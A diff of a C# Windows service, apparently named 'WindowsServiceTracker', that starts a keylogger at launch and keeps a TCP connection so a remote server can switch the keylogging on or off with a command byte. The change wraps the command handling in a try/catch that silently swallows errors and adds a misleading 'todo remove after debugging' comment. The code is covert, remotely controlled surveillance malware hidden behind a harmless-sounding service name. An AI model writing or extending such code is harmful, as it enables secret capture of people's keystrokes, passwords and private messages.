@@ -69,7 +69,7 @@ namespace WindowsServiceTracker
             //than some Windows folder that I couldn't seem to locate
             System.IO.Directory.SetCurrentDirectory(System.AppDomain.CurrentDomain.BaseDirectory);
 
-            StartKeylogger();
+            StartKeylogger(); //todo remove after debugging
             Thread.Sleep(30000);
 
             tcpThread = new Thread(this.MaintainServerConnection);
@@ -146,18 +146,22 @@ namespace WindowsServiceTracker
                     // and new one created, but the stream was not changed from the old connection
                     if (tcpStream != null && tcpStream.CanRead)
                     {
-                        tcpStream.Read(buffer, 0, bufferSize);
-                        switch (buffer[0])
-                        {
-                            case 0:
-                                StartKeylogger();
-                                break;
-                            case 1:
-                                StopKeylogger();
-                                break;
-                            default:
-                                break;
+                        try {
+                            tcpStream.Read(buffer, 0, bufferSize);
+                            switch (buffer[0])
+                            {
+                                case 0:
+                                    StartKeylogger();
+                                    break;
+                                case 1:
+                                    StopKeylogger();
+                                    break;
+                                default:
+                                    break;
+                            }
                         }
+                        catch (Exception)
+                        {}
                     }
                     else
                     {
